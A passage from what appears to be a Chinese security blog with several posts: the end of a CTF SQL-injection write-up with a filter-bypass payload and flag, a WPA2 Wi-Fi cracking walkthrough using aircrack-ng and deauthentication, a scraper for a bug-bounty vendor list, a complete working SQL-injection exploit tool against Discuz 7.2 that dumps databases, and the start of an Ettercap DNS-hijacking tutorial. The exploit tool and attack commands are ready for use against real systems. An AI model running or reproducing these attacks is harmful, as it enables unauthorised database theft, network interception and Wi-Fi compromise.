EtleXdvcmQ9YXJyYXkoImZyb20iLCJzZWxlY3QiLCJsaWtlIiwib3IiKTsNCiAgICBmb3JlYWNoKCRxdWVyeSBhcyAka2V5KQ0KICB7DQogICAgICAgIGZvcmVhY2goJEtleXdvcmQgYXMgJHZhbHVlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvIi4kdmFsdWUuIi8iLHN0cnRvbG93ZXIoJGtleSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGRpZSgiZnVjayB1ISIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KPz4NCg==
</code></pre><p><strong>base64解码后</strong></p>
<pre><code>&lt;?php
error_reporting(0);
$_GET=Add_S($_GET);
$_POST=Add_S($_POST);
$_COOKIE=Add_S($_COOKIE);
$_REQUEST=Add_S($_REQUEST);
function Add_S($array)
{
foreach($array as $key=&gt;$value){
            if(!is_array($value)){
                    $check= preg_match(&apos;/regexp|and|like|\&quot;|%|insert|update|delete|union|into|load_file|outfile|\/\*/i&apos;, $value);
                    if($check)
                            {
                            exit(&quot;Hacker!&quot;);
                    }
            }else{
                    $array[$key]=Add_S($array[$key]);
            }
    }
return $array;
}

function Measurement_url()
{
    $url=parse_url($_SERVER[&apos;REQUEST_URI&apos;]);
    parse_str($url[&apos;query&apos;],$query);
    $Keyword=array(&quot;from&quot;,&quot;select&quot;,&quot;like&quot;,&quot;or&quot;);
    foreach($query as $key)
    {
    foreach($Keyword as $value)
    {
        if(preg_match(&quot;/&quot;.$value.&quot;/&quot;,strtolower($key)))
        {
            die(&quot;fuck u!&quot;);
        }
    }
}
}
?&gt;
</code></pre><p><strong>可以看到其实是写了两个函数分别过滤的，其中<code>ADD_S</code>函数确实是将其里面定义的黑名单sql关键字过滤死了，但是<code>Measurement_url</code>函数中接收url参数值确是通过的<code>parse_url</code>这个函数，之前文章开头也讲到了，使用这个函数取url参数时，会因为url的格式出现一些问题导致该函数返回Flase而绕过过滤，所以我们确定了真正被过滤的关键字只有<code>ADD_S</code>中的那些关键字，而单单过滤这些关键字是不够的，这样我们便通过<code>parse_url</code>函数的漏洞去绕过黑名单的检查，最终读取flag的payload</strong></p>
<pre><code>http://118.126.113.78///web1/?id=1&apos; ^ 1=extractvalue(1,concat(0x3a,(select password from sql_inject1 limit 3,1),0x3a))--+
</code></pre><p><strong>（对select，from的过滤就可以通过parse_url这个函数的漏洞绕过）</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180513/3Lh2A7BimG.png?imageslim" alt="mark"></p>
<pre><code>XPATH syntax error: &apos;:flag{WE_ARe_FaMiLy!1234567}:&apos;
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/19/wificrack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/19/wificrack/" itemprop="url">kali无线网卡wifi破解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-19T18:47:50+08:00">
                2018-04-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/无线安全/" itemprop="url" rel="index">
                    <span itemprop="name">无线安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="kali无线网卡wifi破解"><a href="#kali无线网卡wifi破解" class="headerlink" title="kali无线网卡wifi破解"></a>kali无线网卡wifi破解</h1><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中</strong></p>
<p><strong>2.kali所支持的无线网卡，型号为RT3070，淘宝淘来的</strong></p>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p><strong>1.将usb无线网卡连入虚拟机</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/Dmj4eH7lf8.png?imageslim" alt="mark"><br><strong>2.查看无线网卡wlan0是否存在</strong></p>
<pre><code>iwconfig
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/HEKkcL16ae.png?imageslim" alt="mark"><br><strong>3.开启无线网卡的侦听功能</strong></p>
<pre><code>airmon-ng start wlan0
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/cBd1C0Fmi2.png?imageslim" alt="mark"><br><strong>如果出现无法侦听数据，先kill一下进程再重新启动一下无线网卡</strong></p>
<pre><code>airmon-ng check kill
airmon-ng start wlan0
</code></pre><p><strong>4.iwconfig再次查看网卡，看到无线网卡已经变为了wlan0mon，说明无线网卡开启了监听功能</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/LF9m1D86jA.png?imageslim" alt="mark"><br><strong>5.使用无线网卡侦听附近的wifi信号</strong></p>
<pre><code>airodump-ng wlan0mon
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/j9JD8Ahaj1.png?imageslim" alt="mark"><br><strong>比较重要的几个值，BSSID代表无线网络的唯一标识，也就是路由的MAC地址，CH代表wifi信道，我们攻击的wifi选择了我们实验室的wifi:<code>secevery</code>，可以看到信号还是不错的</strong><br><strong>6.选择要破解的wifi并且抓取握手包</strong></p>
<pre><code>airodump-ng -c 信道 --bssid BSSID -w 保存文件 wlan0mon
</code></pre><p><strong>在这里我们要攻击的BSSID为B0:E1:7E:7D:EA:CC，信道为1</strong></p>
<pre><code>airodump-ng -c 1 --bssid B0:E1:7E:7D:EA:CC -w secevery wlan0mon
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/88FcA7C3Il.png?imageslim" alt="mark"><br><strong>STATION为wifi下所有设备的MAC地址</strong><br><strong>7.如果抓不到握手包，就要模拟station，模拟其断开，就是踢掉相应的设备，使其重连再抓握手包，10表示发送10个包</strong><br>    airepaly-ng -0 10 -a BSSID -c 你要踢掉的设备的MAC地址 wlan0mon<br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/8Jj860fILB.png?imageslim" alt="mark"><br><strong>如果出现红框里的内容，说明抓到握手包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/Ig4ah756CG.png?imageslim" alt="mark"><br><strong>ls查看可以看到已经抓到握手包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/9m6JIILFFF.png?imageslim" alt="mark"></p>
<p><strong>8.进行wifi破解，破解成功</strong></p>
<pre><code>aircrack-ng -a2 -b B0:E1:7E:7D:EA:CC -w passwd.txt secevery-01.cap
</code></pre><p><strong>其中a2代表wifi的加密协议为WPA2</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/fIiLEhjmD8.png?imageslim" alt="mark"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/17/butianspider/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/17/butianspider/" itemprop="url">python爬取补天src列表</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-17T17:28:12+08:00">
                2018-04-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python爬虫挑战/" itemprop="url" rel="index">
                    <span itemprop="name">python爬虫挑战</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="用python爬取补天src列表"><a href="#用python爬取补天src列表" class="headerlink" title="用python爬取补天src列表"></a>用python爬取补天src列表</h1><p><strong>分享一个我写的代码，用python爬取补天src列表，同时可以爬取网站域名和漏洞的提交数和处理数，以公益src为例，贴出我写的代码</strong></p>
<pre><code># -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup
url=&quot;http://loudong.360.cn/Reward/pub&quot;
for pnum in range(1,160):
    r=requests.post(url=url,data={&apos;s&apos;:1,&apos;p&apos;:pnum}).json()
    for info in r[&quot;data&quot;][&quot;list&quot;]:
        company_name=info[&quot;company_name&quot;]
        company_url=&quot;http://loudong.360.cn/Company/&quot;+info[&quot;company_id&quot;]
        html=requests.get(url=company_url).content
        soup=BeautifulSoup(html,&quot;lxml&quot;)
        num=soup.find_all(class_=&quot;spp&quot;)
        print &quot;漏洞数:&quot;,num[0].string,&quot;已处理:&quot;,num[1].string
        surl=&quot;http://loudong.360.cn/Loo/submit?cid=&quot;+info[&quot;company_id&quot;]
        headers={&quot;Cookie&quot;:&quot;你登陆后的cookie&quot;}
        html=requests.get(url=surl,headers=headers).content
        soup=BeautifulSoup(html,&quot;lxml&quot;)
        site=soup.find(&quot;input&quot;,attrs={&quot;placeholder&quot;:&quot;请输入厂商域名&quot;})[&quot;value&quot;]
        print company_name
        print site
        print u&quot;漏洞数:&quot;, num[0].string, u&quot;已处理:&quot;, num[1].string
        print &quot;-------------------------------------------------------------------------------------------------&quot;
</code></pre><p><strong>爬取时需要用到的库</strong></p>
<pre><code>requests库和bs4库
</code></pre><p><strong>补天还是十分好爬的，只要分析好每次请求和响应，爬下关键请求的页面，用bs4的BeautifulSoup解析提取数据即可</strong></p>
<p><strong>关于BeautifulSoup，自己写代码很喜欢用，提取数据很方便，<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="官方文档" target="_blank" rel="external">官方文档</a>写的非常详细</strong></p>
<p><strong>运行结果</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180417/94aIlf0B6K.png?imageslim" alt="mark"></p>
<h3 id="分享我写爬虫的一些经验"><a href="#分享我写爬虫的一些经验" class="headerlink" title="分享我写爬虫的一些经验"></a>分享我写爬虫的一些经验</h3><p><strong>最后总结一下我多次写爬虫所总结的经验和方法，爬取网页数据通用的一些方法</strong></p>
<p><strong>request库常用总结</strong></p>
<pre><code>html=requests.get(url=url,params={params},headers={headers},cookies={cookies},proxies={proxies}).content
用于http GET方法请求的页面，需要提交参数时可以直接在url的?后加参数，也可以将GET请求参数以字典的数据类型赋值给request库get方法中params参数进行提交
参数作用:

params:字典数据类型，存放http请求的GET参数

headers：字典数据类型，里面内容为http的一些请求头，比如Host，User-Agent，主要用来突破一些网站的防爬机制，cookie值也能放到这个里面

cookies:字典数据类型,用来存放cookie值

proxies：字典数据类型,爬取页面所需要设置的代理，比如爬取谷歌和一些国外网站，因为国内被墙了，搭了ss才能访问，但是直接用python请求页面还是不行，这时候就需要在这里进行设置了，我一般是这样设置的,因为我ss客户端设在了本地1088端口:
proxies={&quot;http&quot;:&quot;http://127.0.0.1:1088&quot;,&quot;https&quot;:&quot;https://127.0.0.1:1088&quot;}

html=requests.post(url=url,data={data},headers={headers},cookies={cookies},proxies={proxies}).content
用于http POST方法请求的页面

data:字典数据类型，POST提交的参数

headers，cookie，proxies:均和上述的作用一致
</code></pre><p><strong>re库常用总结</strong></p>
<pre><code>p=re.compile(r&quot;编写的正则表达式&quot;)
用来编译正则表达式对象并且返回一个正则表达式对象
list=p.findall(页面)
匹配页面中和正则表达式匹配的数据并且将所有结果以列表的形式返回
关于正则表达式，需要多加练习，每个人都有不一样的编写正则方法，只要能将需要的数据精确完整匹配出来的方法都是好方法，特别需要注意贪婪匹配和非贪婪匹配的区别和用法(.*?|.*+)
</code></pre><p><strong>bs4库的BeautifulSoup常用总结</strong></p>
<pre><code>使用BeautifulSoup提取数据，首先要了解html DOM格式:
简单来说就是，&lt;标签 属性=&quot;属性值&quot;&gt;文本&lt;/标签&gt;

from bs4 import BeautifulSoup
soup=BeautifulSoup(html,&quot;lxml&quot;)
返回一个BeautifulSoup对象，我一般比较喜欢用lxml格式解析页面，用多了自然就成习惯了
list=soup.find_all(html标签属性=属性值)
寻找html所有匹配&quot;html标签属性=属性值&quot;的html标签并以列表的形式返回，列表中每个值的类型均为BeautifulSoup对象
for i in list:
    i[&quot;属性&quot;]用来提取某一属性下的属性值
    i.string用来提取html标签中的文本
</code></pre><p><strong>urllib库常用总结</strong></p>
<pre><code>urllib.urlretrieve(url,filename)
urllib库的urlretrieve方法主要用来下载文件，通常将页面爬下来后，用正则表达式或者BeautifulSoup将jpg，png一些图片，xls，doc一些文档，或者mp4等视频连接爬下来后，一般都需要用这个库下载
url:资源的链接
filename：文件存放的位置，我一般这样写，filename=yourfilepath+url.split(&apos;/&apos;)[-1],比较方便
</code></pre><h3 id="我对写爬虫的看法"><a href="#我对写爬虫的看法" class="headerlink" title="我对写爬虫的看法"></a>我对写爬虫的看法</h3><p><strong>以上总结了我写代码的一些方法经验，我对编程的看法是：其实每个人写代码的方式都不太一样，代码写的多了就会有自己的风格。代码主要还是为了解决需求，节省人力，能够将代码用到自己的生活或者工作中，是件很有意思的事情，我觉得写python代码的要点有几个:要多动手写，看官方文档的效率比看书高，编程书是用来查的，百度谷歌很强大</strong></p>
<h3 id="python爬虫能力对安全人员的作用"><a href="#python爬虫能力对安全人员的作用" class="headerlink" title="python爬虫能力对安全人员的作用"></a>python爬虫能力对安全人员的作用</h3><p><strong>开发简单的漏扫工具，需要爬虫的基础</strong></p>
<p><strong>根据漏洞编写exp，新爆出的漏洞，exp早写出来可以多刷些漏洞</strong></p>
<p><strong>利用搜素引擎批量刷漏洞，对于新爆出的漏洞，编写exp后结合搜索引擎的语法寻找网络空间中的漏洞相关组件去测试，整个过程都可以用python爬虫技术自动化完成</strong></p>
<p><strong>贴出我很久之前学习python时利用python编写的一个自动化利用漏洞的工具代码，选择的漏洞为<a href="https://www.seebug.org/vuldb/ssvid-87114" title="discuz7.2 fap.php注入" target="_blank" rel="external">discuz7.2 faq.php注入</a>漏洞，实现了类似sqlmap的命令行操作</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180417/ifHaEfc52a.png?imageslim" alt="mark"></p>
<pre><code>#coding=utf-8
import requests
import re
import sys
from optparse import OptionParser
from threading import Thread
def main():
    parser=OptionParser()
    parser.add_option(&quot;-u&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;&quot;)
    parser.add_option(&quot;-r&quot;,type=&quot;string&quot;,dest=&quot;filename&quot;,help=&quot;&quot;)
    parser.add_option(&quot;-C&quot;,type=&quot;string&quot;,dest=&quot;column&quot;,help=&quot;&quot;)
    parser.add_option(&quot;-T&quot;,type=&quot;string&quot;,dest=&quot;table&quot;,help=&quot;&quot;)
    parser.add_option(&quot;-D&quot;,type=&quot;string&quot;,dest=&quot;db&quot;,help=&quot;&quot;)
    parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,dest=&quot;dbs&quot;,help=&quot;&quot;)
    parser.add_option(&quot;--dump&quot;,action=&quot;store_true&quot;,dest=&quot;dump&quot;,help=&quot;&quot;)
    parser.add_option(&quot;--tables&quot;,action=&quot;store_true&quot;,dest=&quot;tables&quot;,help=&quot;&quot;)
    parser.add_option(&quot;--columns&quot;,action=&quot;store_true&quot;,dest=&quot;columns&quot;,help=&quot;&quot;)
    (options,args)=parser.parse_args()
    if options.url and len(sys.argv)==3:
        url=options.url
        result=testurl(url)
        if result:
            getinfo(url)
        else:
            pass
    elif options.url and options.dbs:#--dbs
        url=options.url
        getdbs(url)
    elif options.url and options.tables and options.db:#-u url --tables -D database
        url=options.url
        db=options.db
        gettables(url,db)
    elif options.url and options.columns and options.table and options.db:#-u url --columns -T table -D database
        url=options.url
        table=options.table
        db=options.db
        getcolumns(url,table,db)
    elif options.url and options.dump and options.column and options.table and options.db:#-u url --dump  -C column -T table -D database
        url=options.url
        column=options.column
        table=options.table
        db=options.db
        dumpdata(url,column,table,db)
    elif options.filename:
        filename=options.filename
        testurllist(filename)
def testurl(url):
    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;}
    content=requests.get(url=url,params=payload)
    str=content.text
    p=re.compile(r&quot;You have an error in your SQL syntax&quot;)
    if re.findall(p,str):
        print &quot;this url injectable!&quot;
        return True
    else:
        print &quot;this url not injectable&quot;
        return False
def testurllist(filename):
    try:
        file=open(filename,&quot;r&quot;)
        urllist=[url.strip() for url in file.readlines()]
        for url in urllist:
            print &quot;test url..............%s&quot;%(url)
            testurl(url)
    except IOError,e:
        print &quot;file open error&quot;,e
def getinfo(url):
    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select database()),0x3a)x from information_schema.tables group by x)a)#&apos;}
    content=requests.get(url=url,params=payload)
    str=content.text
    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
    c_db=re.findall(p,str).pop()
    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select user()),0x3a)x from information_schema.tables group by x)a)#&apos;}
    content=requests.get(url=url,params=payload)
    str=content.text
    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
    user=re.findall(p,str).pop()
    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select version()),0x3a)x from information_schema.tables group by x)a)#&apos;}
    content=requests.get(url=url,params=payload)
    str=content.text
    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
    version=re.findall(p,str).pop()
    print &quot;current database:%s\nuser:%s\nversion:%s\n&quot;%(c_db,user,version)
def getdbs(url):
    i=0
    while 1:
        payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select schema_name from information_schema.schemata limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(i)}
        content=requests.get(url=url,params=payload)
        str=content.text
        p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
        dbs=re.findall(p,str)
        if dbs==[]:
            break
        else:
            print dbs[-1]
            i=i+1
def gettables(url,db):
    print &quot;select database:%s&quot;%(db)
    hexdb=&apos;0x&apos;+db.encode(&quot;hex&quot;)
    i=0
    while 1:
        payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select table_name from information_schema.tables where table_schema=%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(hexdb,i)}
        content=requests.get(url=url,params=payload)
        str=content.text
        p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
        table=re.findall(p,str)
        if table==[]:
            break
        else:
            print table[-1]
            i=i+1
def getcolumns(url,table,db):
    print &quot;select database:%s\nselect table:%s&quot;%(db,table)
    hextables=[]
    hextables.append(&quot;0x&quot;+table.encode(&quot;hex&quot;))
    hextables.append(&quot;0x&quot;+(&quot;cdb_&quot;+table).encode(&quot;hex&quot;))
    if table.find(&quot;uc_&quot;)==0:
        hextables.append(&quot;0x&quot;+(table.split(&quot;_&quot;)[1]).encode(&quot;hex&quot;))
    print hextables
    for hextable in hextables:
        i=0
        while 1:
            payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select column_name from information_schema.columns where table_name=%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(hextable,i)}
            content=requests.get(url=url,params=payload)
            str=content.text
            p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
            column=re.findall(p,str)
            if column==[]:
                break
            else:
                print column[-1]
            i=i+1
        print i
def dumpdata(url,column,table,db):
    print &quot;select database:%s\nselect table:%s\nselect column:%s&quot;%(db,table,column)
    column=column.replace(&quot;,&quot;,&quot;,0x3a,&quot;)
    tables=[]
    tables.append(table)
    tables.append(&quot;cdb_&quot;+table)
    if table.find(&quot;uc_&quot;)&gt;=0:
        tables.append(table.split(&quot;_&quot;)[1])
    print tables
    for table in tables:
        i=0
        while 1:
            payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select concat(%s) from %s.%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(column,db,table,i)}
            content=requests.get(url=url,params=payload)
            str=content.text
            p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)
            data=re.findall(p,str)
            if data==[]:
                break
            else:
                print data[-1]
                i=i+1
if __name__==&quot;__main__&quot;:
    main()
</code></pre><h3 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h3><p><strong><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="BeautifulSoup官方文档" target="_blank" rel="external">BeautifulSoup官方文档</a></strong></p>
<p><strong><a href="http://docs.python-requests.org/zh_CN/latest/" title="requests官方文档" target="_blank" rel="external">requests官方文档</a></strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/21/dns_spoof/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/21/dns_spoof/" itemprop="url">Ettercap实现局域网dns劫持</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-21T23:43:32+08:00">
                2018-03-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
                    <span itemprop="name">内网渗透</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Ettercap实现局域网dns劫持百度"><a href="#Ettercap实现局域网dns劫持百度" class="headerlink" title="Ettercap实现局域网dns劫持百度"></a>Ettercap实现局域网dns劫持百度</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>很久之前做过的一个实验，利用kali的Ettercap进行局域网的dns劫持，今天实验课老师碰巧又提到了，于是又做了做，这是一个很好玩的实验</strong></p>
<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中，连接自己的RT3070的无线网卡（网卡一定要是kali2.0支持的型号），同时开启apache服务，进行dns劫持</strong></p>
<p><strong>2.自己的真实机，连接本机电脑的无线网卡</strong></p>
<p><strong>3.RT3070网卡和本机电脑网卡连接同一wifi，保证kali和自己的PC在同一局域网，用kali对自己的PC进行DNS缓存投毒</strong></p>
<p><strong>4.用到的软件:kali中的Ettercap，一个集成工具，里面包括了局域网主机扫描，arp欺骗，DNS劫持等功能</strong></p>
<p><strong>5.浏览器:谷歌浏览器</strong></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>DNS，全称为域名解析协议，是一种将域名解析为ip地址的协议，基于UDP的53端口。比如我们在浏览器访问百度域名，会先向dns服务器发送一次dns请求报文，询问百度的ip地址，dns服务器经过查询（或递归查询）会将百度的域名以及对应的ip地址以dns响应报文的形式发回给我们，然后我们才可以与所对应的ip建立TCP连接进行网络通信。dns劫持建立在arp欺骗的基础上，关于arp的文章之前有写过，链接：<a href="http://lawlietweb.com/2018/01/12/arpattack/" title="arp协议分析&amp;python编程实现arp欺骗抓图片" target="_blank" rel="external">arp协议分析&amp;python编程实现arp欺骗抓图片</a>，通过arp欺骗可以监听受害者机器到网关之间的流量，如果可以过滤协议为UDP，端口为53端口的数据报文，也就是DNS报文，并且将dns响应中的域名所对应的ip地址改写成我们服务器的ip，受害者机器就会与我们的机器进行连接通信，这就是dns投毒的基本原理，kali的Ettercap就可以做到这一点，当然明白了攻击原理，自己编程实现也是可以的，python的scapy库便可以做到，之后有时间会尝试写一下</strong></p>
<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p><strong>1.开启ip转发功能，默认是关闭的</strong></p>
<pre><code>echo &quot;1&quot;&gt; /proc/sys/net/ipv4/ip_forward
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/510leEijb8.png?imageslim" alt="mark"></p>
<p><strong>2.查看kali的ip为192.168.0.106，并且修改Ettercap的配置文件，添加一条dns解析记录（A记录）</strong></p>
<pre><code>* A 192.168.0.106
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/1J1aH0aLj8.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/HDi1m44bg0.png?imageslim" alt="mark"><br><strong>意思是将所有域名都解析到我们kali的ip上</strong></p>
<p><strong>3.<code>service apache2 start</code>开启apache服务,并在/var/www/html下新建index.html,就是我们攻击后想要看到的效果页面，自己简单写了个有意思的页面，效果如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/BkE7FLFB94.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/17EChCh7Jb.png?imageslim" alt="mark"><br><strong>4.准备工作都做好了，接下来使用Ettercap开始我们的攻击,启动Ettercap图形界面</strong></p>
<pre><code>ettercap -G
